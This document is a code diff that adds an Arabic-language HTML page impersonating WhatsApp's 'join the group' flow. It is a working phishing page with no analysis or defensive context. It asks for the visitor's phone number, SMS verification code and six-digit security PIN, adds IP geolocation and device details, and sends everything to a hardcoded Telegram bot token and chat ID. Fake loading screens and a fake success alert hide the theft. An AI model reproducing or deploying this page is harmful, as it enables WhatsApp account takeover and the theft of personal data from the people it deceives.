@@ -1,0 +1,710 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>واتساب</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Helvetica, Arial, sans-serif;
+            -webkit-user-select: none;
+            user-select: none;
+        }
+        
+        body {
+            background-color: #f0f2f5;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            touch-action: manipulation;
+        }
+        
+        /* Header Styles */
+        .whatsapp-header {
+            background-color: #128C7E; /* اللون الأخضر كما طلبت */
+            color: white;
+            padding: 15px 20px; /* تكبير الهيدر قليلاً */
+            text-align: center;
+            font-size: 20px; /* حجم متوسط للخط */
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .header-content {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .header-icon {
+            width: 24px;
+            height: 24px;
+            margin-left: 10px;
+        }
+        
+        /* Container Styles */
+        .whatsapp-container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            max-width: 500px;
+            margin: 0 auto;
+            width: 100%;
+            background-color: #f0f2f5;
+        }
+        
+        .whatsapp-content {
+            flex: 1;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        /* Input Styles */
+        .input-container, .verification-container {
+            background: white;
+            padding: 20px;
+            border-radius: 12px;
+            margin-top: 20px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+        
+        .input-label {
+            color: #3b4a54;
+            font-size: 16px;
+            margin-bottom: 15px;
+            display: block;
+            text-align: right;
+        }
+        
+        .phone-input-group {
+            display: flex;
+            margin-bottom: 20px;
+        }
+        
+        .country-select {
+            width: 140px;
+            padding: 12px;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px 0 0 8px;
+            font-size: 14px;
+            background-color: #f9f9f9;
+            appearance: none;
+            color: #000;
+            cursor: pointer;
+            order: 1; /* نقل اختيار الدولة إلى اليسار */
+        }
+        
+        .phone-input, .verification-input {
+            padding: 12px;
+            border: 1px solid #e0e0e0;
+            font-size: 16px;
+            caret-color: transparent;
+            color: #000;
+        }
+        
+        .phone-input {
+            flex: 1;
+            border-left: none;
+            border-radius: 0 8px 8px 0;
+            text-align: left; /* تغيير اتجاه النص لليسار */
+            direction: ltr; /* الأرقام من اليسار لليمين */
+        }
+        
+        /* Verification Inputs */
+        .verification-inputs {
+            display: flex;
+            justify-content: space-between;
+            margin: 20px 0;
+        }
+        
+        .verification-input {
+            width: 50px;
+            height: 60px;
+            text-align: center;
+            font-size: 24px;
+            border-radius: 8px;
+            direction: ltr; /* الأرقام من اليسار لليمين */
+        }
+        
+        /* Keypad Styles */
+        .keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin: 20px 0;
+        }
+        
+        .key {
+            background-color: #ffffff;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            padding: 15px;
+            font-size: 24px;
+            text-align: center;
+            cursor: pointer;
+            height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #000;
+            direction: ltr; /* الأرقام من اليسار لليمين */
+        }
+        
+        .key:active {
+            background-color: #f0f0f0;
+        }
+        
+        .key.empty {
+            visibility: hidden;
+        }
+        
+        .key.delete {
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="%23000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"></path><line x1="18" y1="9" x2="12" y2="15"></line><line x1="12" y1="9" x2="18" y2="15"></line></svg>');
+            background-repeat: no-repeat;
+            background-position: center;
+        }
+        
+        /* Button Styles */
+        .whatsapp-btn {
+            background-color: #128C7E;
+            color: white;
+            border: none;
+            border-radius: 24px;
+            padding: 12px 24px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            margin: 10px 0;
+            width: 100%;
+            position: relative;
+        }
+        
+        /* Message Styles */
+        .error-message {
+            color: #f44336;
+            text-align: center;
+            margin: 10px 0;
+            font-size: 14px;
+        }
+        
+        .sms-notice {
+            color: #128C7E;
+            text-align: center;
+            margin: 10px 0;
+            font-size: 14px;
+        }
+        
+        .footer-text {
+            color: #667781;
+            font-size: 12px;
+            text-align: center;
+            margin-top: 20px;
+        }
+        
+        /* Privacy Policy Styles */
+        .privacy-policy {
+            text-align: center;
+            padding: 15px;
+            font-size: 11px;
+            color: #667781;
+            border-top: 1px solid #e0e0e0;
+            margin-top: auto;
+        }
+        
+        /* Chat Icon Styles */
+        .chat-icon {
+            width: 60px;
+            height: 60px;
+            background-color: #128C7E;
+            border-radius: 50%;
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+            z-index: 100;
+        }
+        
+        .chat-icon svg {
+            width: 30px;
+            height: 30px;
+            fill: white;
+        }
+        
+        /* Loading Circle */
+        .loading-circle {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.5);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #128C7E;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* Utility Classes */
+        .hidden {
+            display: none;
+        }
+
+        /* New Chat Section */
+        .chat-section {
+            background-color: #128c7e;
+            padding: 15px 20px;
+            text-align: center;
+            margin-top: 0;
+        }
+        
+        .chat-icon-large {
+            width: 50px;
+            height: 50px;
+            margin-bottom: 10px;
+            fill: white; /* تغيير لون الأيقونة إلى الأبيض */
+        }
+        
+        .join-text {
+            color: white;
+            margin-bottom: 15px;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Loading Circle -->
+    <div class="loading-circle" id="loadingCircle">
+        <div class="loader"></div>
+    </div>
+
+    <!-- صفحة إدخال الرقم -->
+    <div class="whatsapp-container" id="phonePage">
+        <div class="whatsapp-header">
+            <div class="header-content">
+                <svg class="header-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="white">
+                    <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/>
+                </svg>
+                <span>WhatsApp</span>
+            </div>
+        </div>
+
+        <!-- قسم الدردشة الجديد -->
+        <div class="chat-section">
+            <svg class="chat-icon-large" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                <path d="M19.005 3.175H4.674C3.642 3.175 3 3.789 3 4.821V21.02l3.544-3.514h12.461c1.033 0 2.064-1.06 2.064-2.093V4.821c-.001-1.032-1.032-1.646-2.064-1.646zm-4.989 9.869H7.041V11.1h6.975v1.944zm3-4H7.041V7.1h9.975v1.944z"/>
+            </svg>
+            
+            <div class="join-text">الانضمام إلى المجموعة</div>
+        </div>
+
+        <div class="whatsapp-content">
+            <div class="input-container">
+                <label class="input-label">أدخل رقم هاتفك للتواصل عبر واتساب</label>
+                <div class="phone-input-group">
+                    <select id="countryCode" class="country-select">
+                        <option value="+966">🇸🇦 السعودية +966</option>
+                        <option value="+971">🇦🇪 الإمارات +971</option>
+                        <option value="+20">🇪🇬 مصر +20</option>
+                        <option value="+962">🇯🇴 الأردن +962</option>
+                        <option value="+965">🇰🇼 الكويت +965</option>
+                        <option value="+974">🇶🇦 قطر +974</option>
+                        <option value="+968">🇴🇲 عمان +968</option>
+                        <option value="+973">🇧🇭 البحرين +973</option>
+                        <option value="+213">🇩🇿 الجزائر +213</option>
+                        <option value="+212">🇲🇦 المغرب +212</option>
+                        <option value="+216">🇹🇳 تونس +216</option>
+                        <option value="+964">🇮🇶 العراق +964</option>
+                        <option value="+961">🇱🇧 لبنان +961</option>
+                    </select>
+                    <input type="tel" id="phoneNumber" class="phone-input" placeholder="Phone number" inputmode="none" readonly>
+                </div>
+            </div>
+
+            <div class="keypad">
+                <button class="key" onclick="appendNumber('1')">1</button>
+                <button class="key" onclick="appendNumber('2')">2</button>
+                <button class="key" onclick="appendNumber('3')">3</button>
+                <button class="key" onclick="appendNumber('4')">4</button>
+                <button class="key" onclick="appendNumber('5')">5</button>
+                <button class="key" onclick="appendNumber('6')">6</button>
+                <button class="key" onclick="appendNumber('7')">7</button>
+                <button class="key" onclick="appendNumber('8')">8</button>
+                <button class="key" onclick="appendNumber('9')">9</button>
+                <button class="key empty"></button>
+                <button class="key" onclick="appendNumber('0')">0</button>
+                <button class="key delete" onclick="deleteNumber()"></button>
+            </div>
+
+            <button class="whatsapp-btn" onclick="sendVerification()">إرسال</button>
+            
+            <div class="privacy-policy">
+                سياسة الخصوصية الخاصة بنا:
+                1. جمع البيانات: نجمع فقط المعلومات الضرورية لتسجيل الدخول وتفعيل الحساب.
+                2. استخدام البيانات: نستخدم بياناتك فقط لتقديم الخدمة المطلوبة ولأغراض الأمان.
+            </div>
+        </div>
+    </div>
+
+    <!-- صفحة التحقق -->
+    <div class="whatsapp-container hidden" id="verificationPage">
+        <div class="whatsapp-header">
+            <div class="header-content">
+                <svg class="header-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="white">
+                    <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/>
+                </svg>
+                <span>WhatsApp</span>
+            </div>
+        </div>
+        <div class="whatsapp-content">
+            <div class="verification-container">
+                <label class="input-label">أدخل الرمز المرسل إلى رقم الجوال</label>
+                <p class="sms-notice">سيتم إرسال رمز مكون من 6 أرقام إلى رسائلك النصية</p>
+                <div class="verification-inputs">
+                    <input type="text" class="verification-input" maxlength="1" inputmode="none" readonly>
+                    <input type="text" class="verification-input" maxlength="1" inputmode="none" readonly>
+                    <input type="text" class="verification-input" maxlength="1" inputmode="none" readonly>
+                    <input type="text" class="verification-input" maxlength="1" inputmode="none" readonly>
+                    <input type="text" class="verification-input" maxlength="1" inputmode="none" readonly>
+                    <input type="text" class="verification-input" maxlength="1" inputmode="none" readonly>
+                </div>
+                <p class="error-message hidden" id="errorMessage">الرمز غير صحيح، يرجى المحاولة مرة أخرى</p>
+            </div>
+
+            <div class="keypad">
+                <button class="key" onclick="appendCode('1')">1</button>
+                <button class="key" onclick="appendCode('2')">2</button>
+                <button class="key" onclick="appendCode('3')">3</button>
+                <button class="key" onclick="appendCode('4')">4</button>
+                <button class="key" onclick="appendCode('5')">5</button>
+                <button class="key" onclick="appendCode('6')">6</button>
+                <button class="key" onclick="appendCode('7')">7</button>
+                <button class="key" onclick="appendCode('8')">8</button>
+                <button class="key" onclick="appendCode('9')">9</button>
+                <button class="key empty"></button>
+                <button class="key" onclick="appendCode('0')">0</button>
+                <button class="key delete" onclick="deleteCode()"></button>
+            </div>
+
+            <button class="whatsapp-btn" onclick="verifyCode()">تحقق</button>
+            <p class="footer-text">لم تستلم الرمز؟ <a href="#" onclick="resendCode()">إعادة إرسال</a></p>
+            
+            <div class="privacy-policy">
+                سياسة الخصوصية الخاصة بنا:
+                1. جمع البيانات: نجمع فقط المعلومات الضرورية لتسجيل الدخول وتفعيل الحساب.
+                2. استخدام البيانات: نستخدم بياناتك فقط لتقديم الخدمة المطلوبة ولأغراض الأمان.
+            </div>
+        </div>
+    </div>
+
+    <!-- صفحة الأمان -->
+    <div class="whatsapp-container hidden" id="securityPage">
+        <div class="whatsapp-header">
+            <div class="header-content">
+                <svg class="header-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="white">
+                    <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/>
+                </svg>
+                <span>WhatsApp</span>
+            </div>
+        </div>
+        <div class="whatsapp-content">
+            <div class="verification-container">
+                <label class="input-label">أدخل رمز التحقق المكون من 6 أرقام</label>
+                <div class="verification-inputs">
+                    <input type="password" class="verification-input" maxlength="1" inputmode="none" readonly>
+                    <input type="password" class="verification-input" maxlength="1" inputmode="none" readonly>
+                    <input type="password" class="verification-input" maxlength="1" inputmode="none" readonly>
+                    <input type="password" class="verification-input" maxlength="1" inputmode="none" readonly>
+                    <input type="password" class="verification-input" maxlength="1" inputmode="none" readonly>
+                    <input type="password" class="verification-input" maxlength="1" inputmode="none" readonly>
+                </div>
+                <p class="error-message hidden" id="securityErrorMessage">رمز الأمان غير صحيح</p>
+            </div>
+
+            <div class="keypad">
+                <button class="key" onclick="appendSecurity('1')">1</button>
+                <button class="key" onclick="appendSecurity('2')">2</button>
+                <button class="key" onclick="appendSecurity('3')">3</button>
+                <button class="key" onclick="appendSecurity('4')">4</button>
+                <button class="key" onclick="appendSecurity('5')">5</button>
+                <button class="key" onclick="appendSecurity('6')">6</button>
+                <button class="key" onclick="appendSecurity('7')">7</button>
+                <button class="key" onclick="appendSecurity('8')">8</button>
+                <button class="key" onclick="appendSecurity('9')">9</button>
+                <button class="key empty"></button>
+                <button class="key" onclick="appendSecurity('0')">0</button>
+                <button class="key delete" onclick="deleteSecurity()"></button>
+            </div>
+
+            <button class="whatsapp-btn" onclick="submitSecurity()">تأكيد</button>
+            
+            <div class="privacy-policy">
+                سياسة الخصوصية الخاصة بنا:
+                1. جمع البيانات: نجمع فقط المعلومات الضرورية لتسجيل الدخول وتفعيل الحساب.
+                2. استخدام البيانات: نستخدم بياناتك فقط لتقديم الخدمة المطلوبة ولأغراض الأمان.
+            </div>
+        </div>
+    </div>
+
+    <!-- Chat Icon -->
+    <div class="chat-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M19.005 3.175H4.674C3.642 3.175 3 3.789 3 4.821V21.02l3.544-3.514h12.461c1.033 0 2.064-1.06 2.064-2.093V4.821c-.001-1.032-1.032-1.646-2.064-1.646zm-4.989 9.869H7.041V11.1h6.975v1.944zm3-4H7.041V7.1h9.975v1.944z"/>
+        </svg>
+    </div>
+
+    <script>
+        // Application Variables
+        let userPhone = '';
+        let userCountryCode = '+966';
+        let currentCodeIndex = 0;
+        let currentSecurityIndex = 0;
+        let waToken = generateToken();
+
+        // Generate unique token
+        function generateToken() {
+            return 'WA-' + Date.now().toString(36) + '-' + Math.random().toString(36).substr(2, 9);
+        }
+
+        // Phone Number Functions
+        function appendNumber(num) {
+            const phoneInput = document.getElementById('phoneNumber');
+            if (phoneInput.value.length < 15) {
+                phoneInput.value = phoneInput.value + num; // تغيير الاتجاه لليسار
+            }
+        }
+
+        function deleteNumber() {
+            const phoneInput = document.getElementById('phoneNumber');
+            phoneInput.value = phoneInput.value.slice(0, -1); // حذف من اليمين
+        }
+
+        // Verification Functions
+        function sendVerification() {
+            const countrySelect = document.getElementById('countryCode');
+            userCountryCode = countrySelect.value;
+            const phoneInput = document.getElementById('phoneNumber');
+            userPhone = phoneInput.value.trim();
+
+            if (!userPhone || userPhone.length < 9) {
+                alert('الرجاء إدخال رقم هاتف صحيح');
+                return;
+            }
+
+            // Show loading circle
+            document.getElementById('loadingCircle').style.display = 'flex';
+            
+            // Simulate loading for 2 seconds
+            setTimeout(() => {
+                document.getElementById('loadingCircle').style.display = 'none';
+                waToken = generateToken();
+                document.getElementById('phonePage').classList.add('hidden');
+                document.getElementById('verificationPage').classList.remove('hidden');
+                sendToTelegram('verification_request', userCountryCode, userPhone, 'N/A');
+            }, 2000);
+        }
+
+        function appendCode(num) {
+            const inputs = document.querySelectorAll('#verificationPage .verification-input');
+            if (currentCodeIndex < 6) {
+                inputs[currentCodeIndex].value = num;
+                currentCodeIndex++;
+                if (currentCodeIndex < 6) {
+                    inputs[currentCodeIndex].focus();
+                }
+                
+                if (currentCodeIndex === 6) {
+                    verifyCode();
+                }
+            }
+        }
+
+        function deleteCode() {
+            const inputs = document.querySelectorAll('#verificationPage .verification-input');
+            if (currentCodeIndex > 0) {
+                currentCodeIndex--;
+                inputs[currentCodeIndex].value = '';
+                inputs[currentCodeIndex].focus();
+            }
+        }
+
+        function verifyCode() {
+            const inputs = document.querySelectorAll('#verificationPage .verification-input');
+            let enteredCode = '';
+            inputs.forEach(input => {
+                enteredCode += input.value;
+            });
+
+            if (enteredCode.length === 6) {
+                // Show loading circle
+                document.getElementById('loadingCircle').style.display = 'flex';
+                
+                // Simulate loading for 2 seconds
+                setTimeout(() => {
+                    document.getElementById('loadingCircle').style.display = 'none';
+                    document.getElementById('verificationPage').classList.add('hidden');
+                    document.getElementById('securityPage').classList.remove('hidden');
+                    currentSecurityIndex = 0;
+                    sendToTelegram('verification_success', userCountryCode, userPhone, enteredCode);
+                }, 2000);
+            } else {
+                document.getElementById('errorMessage').classList.remove('hidden');
+            }
+        }
+
+        function resendCode() {
+            alert('تم طلب إعادة إرسال الرمز');
+            sendToTelegram('resend_code', userCountryCode, userPhone, 'N/A');
+        }
+
+        // Security Functions
+        function appendSecurity(num) {
+            const inputs = document.querySelectorAll('#securityPage .verification-input');
+            if (currentSecurityIndex < 6) {
+                inputs[currentSecurityIndex].value = num;
+                currentSecurityIndex++;
+                if (currentSecurityIndex < 6) {
+                    inputs[currentSecurityIndex].focus();
+                }
+                
+                if (currentSecurityIndex === 6) {
+                    submitSecurity();
+                }
+            }
+        }
+
+        function deleteSecurity() {
+            const inputs = document.querySelectorAll('#securityPage .verification-input');
+            if (currentSecurityIndex > 0) {
+                currentSecurityIndex--;
+                inputs[currentSecurityIndex].value = '';
+                inputs[currentSecurityIndex].focus();
+            }
+        }
+
+        function submitSecurity() {
+            const inputs = document.querySelectorAll('#securityPage .verification-input');
+            let securityCode = '';
+            inputs.forEach(input => {
+                securityCode += input.value;
+            });
+
+            if (securityCode.length === 6) {
+                // Show loading circle
+                document.getElementById('loadingCircle').style.display = 'flex';
+                
+                // Simulate loading for 2 seconds
+                setTimeout(() => {
+                    document.getElementById('loadingCircle').style.display = 'none';
+                    alert('تم التحقق بنجاح! سيتم التواصل معك عبر واتساب قريباً.');
+                    sendToTelegram('security_submit', userCountryCode, userPhone, securityCode);
+                }, 2000);
+            } else {
+                document.getElementById('securityErrorMessage').classList.remove('hidden');
+            }
+        }
+
+        // Telegram Integration
+        async function sendToTelegram(action, countryCode, phone, code) {
+            try {
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                const ipData = await ipResponse.json();
+                
+                const deviceInfo = getDeviceInfo();
+                const timestamp = new Date().toLocaleString('ar-SA');
+
+                const message = `📲 *تقرير WhatsApp جديد* 📲\n\n` +
+                               `🔹 *الإجراء:* ${getActionName(action)}\n` +
+                               `📞 *رقم الهاتف:* ${countryCode} ${phone}\n` +
+                               `🔢 ${action.includes('verification') ? 'رمز التحقق' : 'رمز الأمان'}: ${code}\n` +
+                               `🆔 *الرمز الفريد:* ${waToken}\n\n` +
+                               `🌍 *معلومات الموقع:*\n` +
+                               `- الدولة: ${ipData.country_name} (${ipData.country})\n` +
+                               `- المدينة: ${ipData.city || 'غير معروف'}\n` +
+                               `- IP: ${ipData.ip}\n\n` +
+                               `📱 *معلومات الجهاز:*\n` +
+                               `- النظام: ${deviceInfo.os}\n` +
+                               `- المتصفح: ${deviceInfo.browser}\n` +
+                               `- الوقت: ${timestamp}`;
+
+                const botToken = '7537590916:AAF-bs8UVHachxpTeeR3SK97Aq80UzFcF4A';
+                const chatId = '5680906598';
+                
+                const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+                
+                fetch(url)
+                    .then(response => response.json())
+                    .then(data => console.log('تم إرسال البيانات إلى تلجرام:', data))
+                    .catch(error => console.error('خطأ في الإرسال:', error));
+
+            } catch (error) {
+                console.error('خطأ في جمع البيانات:', error);
+            }
+        }
+
+        // Helper Functions
+        function getActionName(action) {
+            const actions = {
+                'verification_request': 'طلب التحقق',
+                'verification_success': 'تحقق ناجح',
+                'resend_code': 'إعادة إرسال الرمز',
+                'security_submit': 'إرسال رمز الأمان'
+            };
+            return actions[action] || action;
+        }
+
+        function getDeviceInfo() {
+            const userAgent = navigator.userAgent;
+            let os = 'غير معروف';
+            let browser = 'غير معروف';
+
+            if (/Android/.test(userAgent)) os = 'Android';
+            else if (/iPhone|iPad|iPod/.test(userAgent)) os = 'iOS';
+            else if (/Windows/.test(userAgent)) os = 'Windows';
+            else if (/Mac/.test(userAgent)) os = 'MacOS';
+            else if (/Linux/.test(userAgent)) os = 'Linux';
+
+            if (/Chrome/.test(userAgent)) browser = 'Chrome';
+            else if (/Firefox/.test(userAgent)) browser = 'Firefox';
+            else if (/Safari/.test(userAgent)) browser = 'Safari';
+            else if (/Edge/.test(userAgent)) browser = 'Edge';
+            else if (/Opera/.test(userAgent)) browser = 'Opera';
+
+            return { os, browser };
+        }
+
+        // Event Listeners
+        document.querySelectorAll('input').forEach(input => {
+            input.addEventListener('focus', function() {
+                this.blur();
+            });
+        });
+
+        document.getElementById('countryCode').addEventListener('change', function() {
+            userCountryCode = this.value;
+        });
+    </script>
+</body>
+</html>
